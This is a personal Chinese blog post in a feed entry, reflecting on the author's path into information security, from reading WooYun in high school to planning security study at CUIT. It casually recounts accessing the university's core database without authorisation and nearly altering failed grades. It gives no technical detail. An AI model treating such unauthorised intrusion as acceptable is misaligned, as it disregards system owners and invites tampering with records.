        <content type="html"><![CDATA[<p>在二零一八年七月的尾巴，写下这篇文章。算是对过去的一个回忆总结，还有未来的计划。</p><p>做安全，是我高中时候就有的想法。那个时候WooYun还在，我还记得曾经挖到一个小厂的任意用户密码重置的漏洞，注册了第一个账号，踏上了我在安全路上的第一步。</p><p>高中的时候住校，手机查的还严。每天最开心的就是窝在被子里，翻着WooYun，逛逛Zone。看看今天谁家Struts2的洞还没补，哪个厂的裤子又被脱了。当然，还有各路大佬分享的奇技淫巧，一哥猪猪侠，画漫画的小川……</p><p>大学，我来到离家1500KM的成都，因为各种原因，选了一个不喜欢的专业，加了学生会，每天都让自己很忙，常常是通宵在工作，也没有时间再去关注安全圈。第一个学期的学期末，重要的几门专业基础课还是都不懂。我意识到这个专业真的不适合我，即使毕业了，我也不会去做这行。某个晚上，我扯出路由器上的网线，连上学校内网，不小心拿到了支撑学校核心业务的数据库。表里，挂掉的两科静静的躺在那，思考了许久，还是关掉了终端…</p><p>第二个学期，不顾家人反对，我转到了软件专业，学习软件开发。环境原因，班上的计算机水平都不行，凭着高中攒下的知识，吊打大部分人。我开始参加各种比赛，移动开发，大数据，软件杯。一路过来，经历了很多，承担了很多，收获了很多，可以说是我人生成长最多的历程。在这里，我迷失过，特别是我深入开发之后，我发现IT的方向原来这么多，我对每个方向都感兴趣，但一个人不可能把每条路走通，必须找一条合适自己路。开发这条路，我走了很久，也做过自己引以为傲的作品。不过我不喜欢做业务，像是搬砖一样的堆砌代码，写没有灵魂的程序，所以，是时候回去了。</p><p>这一年，最开心的事莫过于通过升本考试，接下来的两年，我将在CUIT继续学习。CUIT最出名的，就是信息安全了吧，也是牛人云集的地方。希望多年以后，再看这篇文章的时候，我也是一枚大佬了。</p><p>不忘初心，方得始终。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> 心路 </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
